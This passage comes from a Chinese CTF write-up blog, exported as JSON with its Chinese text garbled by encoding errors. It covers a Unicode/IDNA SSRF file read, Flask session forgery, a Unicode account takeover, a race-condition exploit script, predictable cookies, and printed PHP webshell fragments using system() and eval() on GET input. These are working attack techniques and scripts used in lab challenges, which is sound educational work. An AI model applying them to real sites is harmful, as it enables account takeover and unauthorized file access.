(IDNA)ï¼Œä½†æœ‰çš„Unicodeå­—ç¬¦è½¬IDNAçš„æ—¶å€™å·²ç»è§£é‡Šæˆæ­£å¸¸ASCIIå­—ç¬¦äº†ï¼ŒPunycodeå°±ä¸ä¼šè¿›è¡Œã€‚ä¸Šè¿°çš„Unicodeå­—ç¬¦ä¸­æœ‰äº›åŒ…å«/ï¼Œå°±ä¼šå¯¹ç½‘å€çš„å«ä¹‰é€ æˆå½±å“ã€‚å¦‚\"â„€\"(U+2100)ï¼Œè½¬æ¢çš„æ—¶å€™å°±å˜æˆäº†a/cï¼Œé€ æˆURLçš„åˆ‡å‰²ã€‚www.fâ„€ke.microsoft.comï¼Œå°±ä¼šå˜æˆwww.fa/cke.microsoft.comï¼ŒåŸŸåå‘ç”Ÿå˜åŒ–ã€‚ PPTçš„ç¬¬36é¡µå°±æ˜¯é¢˜ç›®ä¸­çš„ä»£ç ã€‚å› æ­¤æˆ‘ä»¬å¦‚æ³•ç‚®åˆ¶ï¼Œæ„é€ ä¸€ä¸ªç‰¹æ®ŠURLé€ æˆ/çš„å‡ºç°ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯file://suctf.cc/?ï¼Œæœ€åä¸€ä¸ªcåå‡ºç°/å’Œä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥éå†ä¸€ä¸‹Uä½ codeå­—ç¬¦é›†å§ã€‚ 1234import unicodedatafor i in range(0x0000,0xffff): if &quot;/&quot; in unicodedata.normalize(&quot;NFKC&quot;,chr(i)): print(i,chr(i)) å‡ºä¹æ„æ–™çš„ï¼Œè¿”å›çš„ç»“æœå¹¶ä¸å¤šã€‚ 12345647 &#x2F;8448 â„€8449 â„8453 â„…8454 â„†65295 ï¼ è€Œå…¶ä¸­8453å’Œ8454çš„ç»“æœæ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚é‚£ä¹ˆä¸‹ä¸€æ­¥æ˜¯æˆ‘ä»¬è¯»ä»€ä¹ˆæ–‡ä»¶ï¼Ÿæ³¨æ„åˆ°æœ¬é¢˜ç”¨çš„WebæœåŠ¡å™¨æ˜¯Openrestyï¼ŒLua+Nginxï¼Œé‚£ä¹ˆæˆ‘ä»¬çŒœä¸€ä¸‹è¯»nginxçš„é…ç½®æ–‡ä»¶å§ã€‚ http://233bff3e-839d-4464-a0c6-6e36ee1325d3.node1.buuoj.cn/getUrl?url=file%3A%2F%2Fsuctf.c%E2%84%86sr%2Flocal%2Fnginx%2Fconf%2Fnginx.conf è¿”å›server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; # location /flag &#123; # alias /usr/fffffflag; # &#125; &#125; é‚£ä¹ˆç›´æ¥è¯»/usr/fffffflagå°±å¥½äº†ã€‚ ä¸Šé¢çš„Unicodeå­—ç¬¦æŸ¥æ‰¾æ–¹å¼æ˜¯å®Œå…¨æŒ‰ç…§Paperæ¥çš„ã€‚å…¶å®æˆ‘ä»¬å¯ä»¥æ”¾å¼€é™åˆ¶ï¼Œåªè¦suctf.ccçš„æœ€åä¸€ä¸ªcåœ¨IDNAç¼–ç åæ˜¯ASCII cå³å¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode(): for x in range(65536): uni=chr(x) url=&quot;http://suctf.c&#123;&#125;&quot;.format(uni) try: if getUrl(url): print(&quot;str: &quot;+uni+&#x27; unicode: \\\\u&#x27;+str(hex(x))[2:]) except: passdef getUrl(url): url = url host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return False parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return False newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return True else: return Falseif __name__==&quot;__main__&quot;: get_unicode() åŒæ ·å¯ä»¥æ‰¾åˆ°åˆé€‚çš„Unicodeå­—ç¬¦ã€‚ flag{82faae26-4da6-4cf1-b8fc-37dfdd7790f04}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Unicode","slug":"Unicode","permalink":"http://tiaonmmn.github.io/tags/Unicode/"}]},{"title":"BUUOJåˆ·é¢˜-Web-admin","slug":"BUUOJåˆ·é¢˜-Web-admin","date":"2019-09-02T06:58:02.000Z","updated":"2019-12-10T12:15:12.589Z","comments":true,"path":"2019/09/02/BUUOJåˆ·é¢˜-Web-admin/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-admin/","excerpt":"HCTF 2018çš„adminã€‚ ä¸Šæ¥è®©æˆ‘ä»¬æ³¨å†Œï¼ŒåŒæ—¶ç½‘é¡µæ³¨é‡Šæç¤ºyou are not admin.çœ‹æ¥å¾—å…ˆæ‹¿åˆ°adminæƒé™æ‰è¡Œã€‚ç™»å½•ååœ¨change_passwordå¤„å‘ç°æºä»£ç æç¤ºhttps://github.com/woadsl1234/hctf_flask/ï¼Œä¸‹è½½çœ‹çœ‹ã€‚ Flaskç¨‹åºï¼Œè·¯ç”±åœ¨routes.pyä¸­ï¼Œ/editæ˜¯ä¸ªå‡åŠŸèƒ½ï¼Œç”¨çš„SQLAlchemyï¼Œæ²¡å‘ç°ä»€ä¹ˆSQLæ³¨å…¥ç‚¹ã€‚åœ¨templates.htmlä¸­æœ‰ä¸€å¥{% if current_user.is_authenticated and session['name'] == 'admin' %}ï¼Œsession['name']ä¸ºadminæ—¶æ˜¾ç¤ºflagã€‚","text":"HCTF 2018çš„adminã€‚ ä¸Šæ¥è®©æˆ‘ä»¬æ³¨å†Œï¼ŒåŒæ—¶ç½‘é¡µæ³¨é‡Šæç¤ºyou are not admin.çœ‹æ¥å¾—å…ˆæ‹¿åˆ°adminæƒé™æ‰è¡Œã€‚ç™»å½•ååœ¨change_passwordå¤„å‘ç°æºä»£ç æç¤ºhttps://github.com/woadsl1234/hctf_flask/ï¼Œä¸‹è½½çœ‹çœ‹ã€‚ Flaskç¨‹åºï¼Œè·¯ç”±åœ¨routes.pyä¸­ï¼Œ/editæ˜¯ä¸ªå‡åŠŸèƒ½ï¼Œç”¨çš„SQLAlchemyï¼Œæ²¡å‘ç°ä»€ä¹ˆSQLæ³¨å…¥ç‚¹ã€‚åœ¨templates.htmlä¸­æœ‰ä¸€å¥{% if current_user.is_authenticated and session['name'] == 'admin' %}ï¼Œsession['name']ä¸ºadminæ—¶æ˜¾ç¤ºflagã€‚ # Sessionæ¬ºéª— æ—¢ç„¶ç”¨çš„Flaskï¼Œè€Œä¸”çœ‹ä¸€éæºç ï¼Œæ²¡æœ‰å¯¹Sessionè¿›è¡Œä»€ä¹ˆå¥‡æ€ªæ“ä½œï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¹é¡µé¢ä¼ é€’è¿‡æ¥çš„Sessionè¿›è¡Œdecodeã€‚å‚è€ƒè¿™ä¸ªï¼Œç…§æŠ„è„šæœ¬è§£å¯†cookieã€‚ 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(&#x27;.&#x27;, 1) payload, timestamp = payload.rsplit(&#x27;.&#x27;, 1) decompress = False if payload.startswith(&#x27;.&#x27;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&#x27;Could not base64 decode the payload because of &#x27; &#x27;an exception&#x27;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&#x27;Could not zlib decompress the payload before &#x27; &#x27;decoding the payload&#x27;) return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;: print(decryption(sys.argv[1].encode())) æˆ–è€…è¿™ä¸ª 1234567891011121314151617181920import base64import zlibEXAMPLE_SESSION = &quot;.eJw9kMGOgkAMhl9l07MHVvBC4sEEJJB0JpjiZOZiVFCYATcBjDDGd99ZN_HSy9d-7d8nHC59NdQQjv29WsChKSF8wtcJQmCdtGhTH2kzS7vxpJBLFmUtUmaUKFYYFRMn9NB1KcpnZuMZrQlQKKMS-eAJrjDZaTdlkIzPKPWlzS0mW4P6_FB0nVSybzmVjRL5JG3WYOR4VwRMpzM6h6RNwCm3SuxqHhWBpFK7Xb6iYokiaxXVNSbpGl4LOA_95TD-mOr2iSDp7KGIH6pLJ2ZdHGpbV2cu9hqj2Ps7G_XecCEnFm1d4LJm1_Vb13THa_Ux5br2Kf8nt2PnAIzVMMIC7kPVv98G3x68fgHcO26J.XWzFXA.9Z-Tu9gpzsrd4sNdUecbrNh0rvo&quot;def decodeCookiePayload(): if EXAMPLE_SESSION[0] == &#x27;.&#x27;: session_payload = EXAMPLE_SESSION[1:].split(&#x27;.&#x27;)[0] print(&quot;Extracted Session datas : &#123;&#125;&quot;.format(session_payload)) decoded_session_payload = base64.urlsafe_b64decode(session_payload) decompressed_session_payload = zlib.decompress(decoded_session_payload) print(&quot;Extracted decoded uncompressed datas : &#123;&#125; &quot;.format(decompressed_session_payload))if __name__ == &#x27;__main__&#x27;: print(&quot;Flask Cookie Session Datas Decoder&quot;) decodeCookiePayload() è§£å‡ºæ¥è¿™ä¸ªä¸œè¥¿ï¼š&#123;u'csrf_token': 'a741a0fb176319ec329ec014e4225d9f141fc7a6', u'user_id': u'10', u'name': u'test', u'image': 'B8wM', u'_fresh': True, u'_id': '6f3327102c04af642e12dee9051934333e427123981fddf08c90dcccd197527c430ad270e81dee97bed1c2b0432e86220f0a08943eda858a7ce47e561bee8a0b'&#125;ã€‚æˆ‘ä»¬çœ‹åˆ°äº†nameï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æŠŠnameæ”¹æˆadminã€‚ åˆ°githubä¸Šæ‰¾åˆ°äº†è¿™ä¸ªã€‚ä»–è¦æ±‚æˆ‘ä»¬æ‰¾åˆ°SECRET_KEYã€‚åœ¨config.pyä¸­ç¡®å®æœ‰SECRET_KEYçš„å‡ºç°ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹ckj123ã€‚æ³¨æ„ï¼Œåœ¨æºç ä¸­æˆ‘ä»¬çœ‹ä¸å‡ºæ¥æ˜¯å¦æ˜¯Python3ï¼Œæ‰€ä»¥ä¸¤ä¸ªç‰ˆæœ¬éƒ½è¯•ä¸€ä¸‹ã€‚æ³¨æ„è¦æŠŠUnicodeè¯´æ˜ç¬¦å»æ‰ã€‚ç”¨Python3ç‰ˆæœ¬æ›¿æ¢Cookieåè®¿é—®indexæˆåŠŸå¾—åˆ°flagã€‚ Unicodeæ¬ºéª— åœ¨routes.pyæœ‰å…³/changeçš„ä»£ç ä¸­ï¼Œæœ‰ä¸€è¡Œå¾ˆå¥‡æ€ªã€‚name=strlower(session['name'])ï¼ŒåŒæ ·çš„ï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™ä¹Ÿè¦æ±‚nameè¢«strlower()å¤„ç†è¿‡ã€‚è€Œstrlowerä¸æ˜¯Pythonè‡ªå¸¦å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ¥æºäºtwisted.words.protocols.jabber.xmpp_stringprepçš„nodeprepï¼Œé‚£ä¹ˆæˆ‘ä»¬å»æ‰¾ä¸€ä¸‹twistedçš„æ–‡æ¡£ã€‚æ³¨æ„åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œtwistedçš„ç‰ˆæœ¬ç°åœ¨ä¸º19.2.0ï¼Œè€Œé¢˜ç›®ä¸­è¦æ±‚ä½¿ç”¨10.2.0ï¼Œä¼°è®¡é—®é¢˜å°±å‡ºåœ¨è¿™é‡Œã€‚10.2.0ç‰ˆæœ¬çš„æºç åœ¨è¿™é‡Œï¼Œåœ¨nodeprepä¸Šå’Œæœ€æ–°ç‰ˆæœ¬çš„æ²¡æœ‰å¤ªå¤§å·®åˆ«ã€‚é‚£ä¹ˆæˆ‘ä»¬å†å»æ‰¾æ‰¾ï¼ŒGoogle \"twisted nodeprep\"ï¼Œåœ¨redditä¸Šæ‰¾åˆ°äº†è¿™ä¸ªã€‚ç®€å•æ¥è®²ï¼ŒUnicodeå­—ç¬¦æœ‰ä¸€ç±»æ‹‰ä¸æ–‡å°å­—ç¬¦ï¼Œnodeprepä¼šå°†å…¶è½¬æˆå¤§å†™ã€‚å¦‚á´¬(U+1D2C)ï¼Œè°ƒç”¨nodeprep.prepare()åä¼šå˜æˆAï¼Œå†æ¬¡è°ƒç”¨ä¼šå˜æˆaã€‚ é‚£ä¹ˆæ”»å‡»æ­¥éª¤å°±å¾ˆæ˜ç¡®äº†ï¼šæ³¨å†Œä¸€ä¸ªá´¬dminç”¨æˆ·ï¼Œç™»å½•ä¼šå˜æˆAdminï¼Œç„¶åå»ä¿®æ”¹å¯†ç ï¼Œè¿™æ—¶ä¿®æ”¹çš„å®é™…ä¸Šæ˜¯adminç”¨æˆ·çš„å¯†ç ã€‚æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ç™»å½•äº†ã€‚ æ¡ä»¶ç«äº‰ åœ¨æºç app/routes.pyä¸­login()å’Œchange()éƒ½å¯ä»¥çœ‹åˆ°è¿™å‡ è¡Œï¼š 1234if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() session['name']æ˜¯å…ˆèµ‹çš„å€¼ï¼Œåè¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬å…ˆæ­£å¸¸ç™»é™†å¾—åˆ°sessionï¼Œç„¶åç”¨åˆšæ‰çš„sessionå†æ¬¡ç™»å½•ä½¿å¾—session['name']='admin'ï¼Œç„¶åå†change_passwordå°±å¯ä»¥æ”¹æ‰å¯†ç äº†ã€‚ä½†æ˜¯æ­£å¸¸æ‰‹æ®µæ˜¯è‚¯å®šä¸è¡Œçš„ï¼Œæ­£å¸¸ç™»å½•åè®¿é—®/loginç›´æ¥è·³è½¬ï¼Œæˆ‘ä»¬éœ€è¦æŸç§æ–¹æ³•ä½¿å¾—ç”¨æˆ·æˆåŠŸç™»é™†åå–æ¶ˆæ‰current_user.is_authenticatedã€‚æˆ‘ä»¬å¯ä»¥åŒæ—¶å¼€å¯ä¸¤ä¸ªç™»å½•è¿›ç¨‹ï¼Œä¸€ä¸ªåœ¨ç™»é™†åæ”¹å¯†ç ï¼Œè¿è¡Œåˆ°name=strlower(session['name'])çš„æ—¶å€™ï¼Œå¦ä¸€ä¸ªè¿›ç¨‹è¿›è¡Œlogoutæ“ä½œï¼Œå¹¶å°è¯•ä»¥adminç”¨æˆ·åç™»å½•ã€‚session['name']å°±ä¼šå˜æˆadminã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344import sysimport threadingimport timeimport requestsurl = &quot;http://706ef821-ae29-46f1-9027-2d7189c508a0.node3.buuoj.cn/&quot;def login(s: requests.sessions.Session, username, password): data = &#123;&quot;username&quot;: username, &quot;password&quot;: password, &#x27;submit&#x27;: &quot;&quot;&#125; return s.post(url=url + &quot;login&quot;, data=data)def logout(s: requests.sessions.Session): return s.post(url=url + &quot;logout&quot;)def change(s: requests.sessions.Session, newpass): data = &#123;&quot;newpassword&quot;: newpass&#125; return s.post(url=url, data=data)def func1(s: requests.sessions.Session): login(s,&#x27;tiaonmmn&#x27;, &#x27;tiaonmmn&#x27;) change(s, &#x27;tiaonmmn&#x27;)def func2(s: requests.sessions.Session): logout(s) result = login(s,&#x27;admin&#x27;, &#x27;admin&#x27;) print(result.text) if &quot;Invalid&quot; not in result.text: print(result.cookies) sys.exit(0)if __name__ == &quot;__main__&quot;: for i in range(1000): print(&quot;[+] Round &#123;0&#125;&quot;.format(i)) s = requests.Session() t1 = threading.Thread(target=func1, args=(s,)) t2 = threading.Thread(target=func2, args=(s,)) t1.start() t2.start() time.sleep(0.5) æˆ–è€…ï¼Œæœ‰å¦å¤–ä¸€ç§éªšæ“ä½œï¼šæºç é‡Œç»™å‡ºäº†Dockerfileï¼Œå¯ä»¥çŸ¥é“æœ¬é¢˜æ¯30åˆ†é’Ÿæ¸…ç†ä¸€æ¬¡æ•°æ®åº“ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åç™»é™†ï¼Œç­‰30åˆ†é’Ÿåå°è¯•ç™»å½•adminï¼Œå†æ³¨å†Œç›¸åŒç”¨æˆ·åçš„è´¦å·å°±ä¼šç›´æ¥å¾—åˆ°adminèº«ä»½ã€‚ æ³¨å†Œç”¨æˆ·åå¾—åˆ°ä¸€ä¸ªuser_idï¼Œ30åˆ†é’Ÿåuser_idä¸å­˜åœ¨ï¼Œæ•°æ®åº“æŸ¥è¯¢ä¼šå¤±è´¥ï¼Œæˆ‘ä»¬ä»¥adminç™»å½•ï¼Œsession['name']='admin'ï¼Œå†æ¬¡æ³¨å†Œåuser_idåˆæ³•ï¼Œè€Œæ­¤æ—¶session['name']å·²ç»æ˜¯adminäº†ï¼Œç›´æ¥æ‹¿åˆ°adminæƒé™ã€‚ flag{ae5d2ccc-ec38-4d66-ad72-f50aa54d43ba}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Flask","slug":"Flask","permalink":"http://tiaonmmn.github.io/tags/Flask/"}]},{"title":"RuCTF2019-beacons","slug":"RuCTF2019-beacons","date":"2019-09-01T13:07:21.000Z","updated":"2019-12-10T12:15:12.674Z","comments":true,"path":"2019/09/01/RuCTF2019-beacons/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/01/RuCTF2019-beacons/","excerpt":"RuCTF 2019 Finalæ˜¯ä¸€ä¸ªçº¿ä¸ŠAWDæ¯”èµ›ã€‚ä»Šå¤©çœ‹ä¸€ä¸‹å…¶ä¸­çš„beaconsé¢˜ã€‚RuCTFçš„flagä¸ä¼šä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼ŒåŸºæœ¬éƒ½åœ¨æ•°æ®åº“ä¸­ã€‚ Python 3.6 Sanicæ¡†æ¶+MongoDBã€‚Sanicæ¡†æ¶è·Ÿflaskçš„è¯­æ³•å…¶å®æ„Ÿè§‰æœ‰ç‚¹åƒï¼Œä¹Ÿæ˜¯ä¸€ä¸ªMVCæ¡†æ¶ï¼Œcontrollersçš„ä»£ç åœ¨controllersç›®å½•ä¸‹ã€‚æˆ‘æ‰“AWDå–œæ¬¢é»‘ç™½ç›’åŒæ—¶ç”¨ã€‚æœ¬é¢˜çš„flagä¿å­˜åœ¨éšæœºç”¨æˆ·ä¸­çš„æŸä¸ªbeaconä¿¡æ¯ä¸­ã€‚","text":"RuCTF 2019 Finalæ˜¯ä¸€ä¸ªçº¿ä¸ŠAWDæ¯”èµ›ã€‚ä»Šå¤©çœ‹ä¸€ä¸‹å…¶ä¸­çš„beaconsé¢˜ã€‚RuCTFçš„flagä¸ä¼šä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼ŒåŸºæœ¬éƒ½åœ¨æ•°æ®åº“ä¸­ã€‚ Python 3.6 Sanicæ¡†æ¶+MongoDBã€‚Sanicæ¡†æ¶è·Ÿflaskçš„è¯­æ³•å…¶å®æ„Ÿè§‰æœ‰ç‚¹åƒï¼Œä¹Ÿæ˜¯ä¸€ä¸ªMVCæ¡†æ¶ï¼Œcontrollersçš„ä»£ç åœ¨controllersç›®å½•ä¸‹ã€‚æˆ‘æ‰“AWDå–œæ¬¢é»‘ç™½ç›’åŒæ—¶ç”¨ã€‚æœ¬é¢˜çš„flagä¿å­˜åœ¨éšæœºç”¨æˆ·ä¸­çš„æŸä¸ªbeaconä¿¡æ¯ä¸­ã€‚ æ‰“å¼€å°±è®©ä½ ç™»å½•æˆ–è€…æ³¨å†Œã€‚æˆ‘ä»¬å…ˆçœ‹login.pyå§ã€‚loginçš„æ—¶å€™ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½è¶…40ä¸ªå­—ç¬¦ã€‚æ³¨å†ŒåŒç†ï¼Œç”¨æˆ·åå’Œå¯†ç åªå…è®¸å‡ºç°[A-Za-z0-9_]è¿™äº›å­—ç¬¦ï¼Œæ³¨å†Œçš„æ—¶å€™ä¼šå†™å…¥ç”¨æˆ·å(name)ã€å¯†ç (password)ã€beaconså’Œä¸€ä¸ªinvitesï¼Œinvitesæ˜¯é€šè¿‡get_invites()å‡½æ•°ç”Ÿæˆçš„ï¼Œå¤§è‡´ä¸Šå°±æ˜¯éšæœºç”Ÿæˆ200ä¸ªéšæœºUUIDå­—ç¬¦ä¸²ã€‚ controllerså…¶ä½™çš„å‡½æ•°æ‰€è¦æ±‚çš„@auth.login_requiredæ³¨è§£æ¥æºäºsessions.pyã€‚è¿™é‡Œè¡¨æ˜ï¼Œè¯¥ç¨‹åºä½¿ç”¨åä¸ºsessionçš„Cookieç”¨äºè¡¨ç¤ºèº«ä»½ã€‚æ³¨æ„ä¸‹åˆ—ä»£ç ï¼š 1234def _cookie_gen(self, cookie=&#x27;&#x27;): while True: cookie = hashlib.md5(cookie.encode()).hexdigest() yield cookie cookieç”Ÿæˆæ–¹å¼ä¸ºå¯¹ä¸Šä¸€cookieè¿›è¡Œmd5 hashï¼Œæœ€åˆçš„cookieä¸ºç©ºã€‚è¿™å°±æ˜¯æ­¤é¢˜çš„æ¼æ´ç‚¹ä¸€ï¼šcookieå®Œå…¨å¯é¢„æµ‹ã€‚å®æµ‹www.cmd5.comç­‰ç½‘ç«™å¯¹äºmd5(md5())åŠ å¯†æ”¯æŒè‰¯å¥½ï¼Œå› æ­¤æˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡å¯¹ç°æœ‰cookieè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°ä¸Šä¸€ç™»å½•ç”¨æˆ·çš„cookieï¼Œè¿›è€Œå†’å……ç™»å½•ã€‚ç„¶åæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ç›¸åº”çš„beaconä¿¡æ¯ã€‚ å›åˆ°æ­£å¸¸æµç¨‹æ¥ã€‚åœ¨ç™»é™†åè¿›å…¥ä¸»é¡µé¢ã€‚è¿™éƒ¨åˆ†åœ¨controllersä¸‹çš„map.pyä¸­ã€‚æ¸²æŸ“map.htmlï¼Œæ¥å—ç”¨æˆ·å¯¹åœ°å›¾çš„ç‚¹å‡»å‚æ•°ï¼Œé€šè¿‡center_xå’Œcenter_yæ¥å—Xå’ŒYå€¼ã€‚ç„¶åget_beacons()å‡½æ•°æŸ¥è¯¢(center_x,center_y)æ‰€æŒ‡ä½ç½®æ˜¯å¦æœ‰beaconã€‚ åœ¨beacon.pyä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ beaconï¼Œè¦æ±‚nameä¸å¤§äº25ä¸ªå­—ç¬¦ï¼Œä¸”åªèƒ½å‡ºç°[A-Za-z0-9_]ä¸­çš„å­—ç¬¦ï¼Œcommentä¸å¤§äº255ä¸ªå­—ç¬¦ï¼Œä¸”åªèƒ½å‡ºç°[A-Za-z0-9_!?.,=']ä¸­çš„å­—ç¬¦ã€‚æ¯ä¸ªç”¨æˆ·åªèƒ½åˆ›å»ºè‡³å¤š200ä¸ªbeaconï¼Œåæ ‡ä¸èƒ½é‡å¤ã€‚ç”¨æˆ·å‘å¸ƒprivateçš„beaconåå¯ä»¥é€šè¿‡inviteså…±äº«ç»™å…¶ä»–ç”¨æˆ·ã€‚invitesä»åˆ›å»ºç”¨æˆ·æ—¶çš„inviteså–å€¼ã€‚è€Œåˆ›å»ºpublicçš„beaconæ—¶æ˜¯å…¨ç½‘ç«™ç”¨æˆ·éƒ½å¯ä»¥çœ‹åˆ°çš„ã€‚åˆ›å»ºbeaconåå¯ä»¥ä¸Šä¼ ç…§ç‰‡ã€‚ä¸Šä¼ çš„ç…§ç‰‡é€šè¿‡content-typeè·å–ï¼Œä¸ºimage/jpg,image/jpeg,image/tiffè¿™ä¸‰ç§ä¹‹ä¸€ã€‚è€Œè®¿é—®/Beacon/GetUserBeaconså¯ä»¥è·å¾—å½“å‰ç”¨æˆ·çš„beaconä¿¡æ¯ï¼Œè®¿é—®/Beacon/&lt;beaconid&gt;å¯ä»¥è·å–å•ç‹¬beaconçš„ä¿¡æ¯ã€‚ photo_controller.pyä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®/Photo/GetLatestè·å¾—æœ€è¿‘publicçš„beaconçš„ç…§ç‰‡ï¼Œ/Photo/GetPhoto/&lt;photoid&gt;è·å–photoçš„ä¿¡æ¯ã€‚ flag{9cdcdbbf-1c2b-40da-92d9-042d777cbf5e}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"RuCTF","slug":"RuCTF","permalink":"http://tiaonmmn.github.io/tags/RuCTF/"},{"name":"Sanic","slug":"Sanic","permalink":"http://tiaonmmn.github.io/tags/Sanic/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://tiaonmmn.github.io/tags/MongoDB/"}]},{"title":"BUUOJåˆ·é¢˜-Web-é«˜æ˜çš„é»‘å®¢","slug":"BUUOJåˆ·é¢˜-Web-é«˜æ˜çš„é»‘å®¢","date":"2019-08-30T09:45:28.000Z","updated":"2019-12-10T12:15:12.605Z","comments":true,"path":"2019/08/30/BUUOJåˆ·é¢˜-Web-é«˜æ˜çš„é»‘å®¢/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/30/BUUOJ%E5%88%B7%E9%A2%98-Web-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/","excerpt":"2019å¼ºç½‘æ¯é«˜æ˜çš„é»‘å®¢ã€‚ æ‰“å¼€é¡µé¢ï¼Œå†™å¾—å¾ˆæ˜ç™½ã€‚www.tar.gzä¸‹è½½åå‘ç°æœ‰3001ä¸ªPHPæ–‡ä»¶ã€‚æ¯ä¸ªPHPæ–‡ä»¶éƒ½æœ‰ç±»ä¼¼çš„ä»£ç æ®µï¼Œçœ‹èµ·æ¥åƒæ˜¯ä¸ªè‡ªåŠ¨ä»£ç ç”Ÿæˆçš„äº§ç‰©ã€‚ ç»“æ„æœ‰å¦‚ä¸‹å‡ ç§ï¼š","text":"2019å¼ºç½‘æ¯é«˜æ˜çš„é»‘å®¢ã€‚ æ‰“å¼€é¡µé¢ï¼Œå†™å¾—å¾ˆæ˜ç™½ã€‚www.tar.gzä¸‹è½½åå‘ç°æœ‰3001ä¸ªPHPæ–‡ä»¶ã€‚æ¯ä¸ªPHPæ–‡ä»¶éƒ½æœ‰ç±»ä¼¼çš„ä»£ç æ®µï¼Œçœ‹èµ·æ¥åƒæ˜¯ä¸ªè‡ªåŠ¨ä»£ç ç”Ÿæˆçš„äº§ç‰©ã€‚ ç»“æ„æœ‰å¦‚ä¸‹å‡ ç§ï¼š 12345$_GET[&#x27;jVMcNhK_F&#x27;] = &#x27; &#x27;;system($_GET[&#x27;jVMcNhK_F&#x27;] ?? &#x27; &#x27;); 12345$_GET[&#x27;tz2aE_IWb&#x27;] = &#x27; &#x27;;echo \\`&#123;$_GET[&#x27;tz2aE_IWb&#x27;]&#125;\\`; 12345$_GET[&#x27;cXjHClMPs&#x27;] = &#x27; &#x27;;echo \\`&#123;$_GET[&#x27;cXjHClMPs&#x27;]&#125;\\`; 1234567891011121314151617function ZwXq7h4()&#123; $kg = &#x27;eTgcwk&#x27;; $tWpHGUieX = &#x27;BL02r6&#x27;; $eGPiYwW9IX3 = &#x27;d0agCqWE&#x27;; $YRGLSyUMNnN = new stdClass(); $YRGLSyUMNnN-&gt;IfsR = &#x27;tpt7Y_H&#x27;; $YRGLSyUMNnN-&gt;aLX6ZxLYjJ = &#x27;QlHS60c&#x27;; $kg = $_POST[&#x27;i84HFoocE21gs&#x27;] ?? &#x27; &#x27;; $tWpHGUieX = explode(&#x27;Q7iPB9MuttH&#x27;, $tWpHGUieX); if(&#x27;cg6BNgitU&#x27; == &#x27;RGcyY1oQX&#x27;) system($_GET[&#x27;cg6BNgitU&#x27;] ?? &#x27; &#x27;); $_GET[&#x27;ganVMUq3d&#x27;] = &#x27; &#x27;; eval($_GET[&#x27;ganVMUq3d&#x27;] ?? &#x27; &#x27;); &#125;ZwXq7h4(); 12345$wr2t = &#x27;Qhh4_apLRLY&#x27;;$wr2t = $_POST[&#x27;K3Udo9aauO&#x27;] ?? &#x27; &#x27;; æ•´ä½“æ¥è®²ï¼Œä»£ç 